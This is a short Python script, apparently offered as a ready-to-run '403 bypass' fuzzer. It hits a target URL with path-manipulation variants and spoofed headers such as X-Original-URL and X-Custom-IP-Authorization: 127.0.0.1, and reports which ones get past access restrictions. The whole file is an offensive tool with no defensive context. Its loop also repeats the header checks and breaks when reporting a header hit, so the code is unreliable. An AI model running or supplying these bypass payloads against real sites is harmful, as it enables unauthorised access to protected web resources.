# -*- coding: utf_8 -*-
# bypass 403 code fuzzer
# author: 99

import requests,sys

banner = '''
  _  _    ___ _____ _                               
 | || |  / _ \___ /| |__  _   _ _ __   __ _ ___ ___ 
 | || |_| | | ||_ \| '_ \| | | | '_ \ / _` / __/ __|
 |__   _| |_| |__) | |_) | |_| | |_) | (_| \__ \__ 
    |_|  \___/____/|_.__/ \__, | .__/ \__,_|___/___/
                          |___/|_|                  
                          c0de by 99
'''

print(banner)

def bypass(url,path):
    headerspayloads = [{'X-Original-URL': "/"+path},{'X-Custom-IP-Authorization': '127.0.0.1'},{'Referer': "/"+path}]
    payloads = [url + '/' +path,url + '/%2e/' + path,url + '/' + path + '/.',url + '//' + path + '//',url + '/./' + path + '/./',url + '/' + path + '.json',url + '/' + path + '?',url + '/' + path + '..;',url + '/' + path + '??']

    for i in range(0,12):
        if i < 9:
            r = requests.get(payloads[i])
            if r.status_code == 200:
                print(payloads[i])
        else:
            for j in range(0,3):
                r = requests.get(url + '/' + path,headers=headerspayloads[j])
                if r.status_code == 200:
                    print(url + '/' + path + headerspayloads[j])

if __name__ == '__main__':
    try:
        url,path = sys.argv[1:3]
        bypass(url,path)
    except Exception as e:
        print(sys.argv)
        print(e)
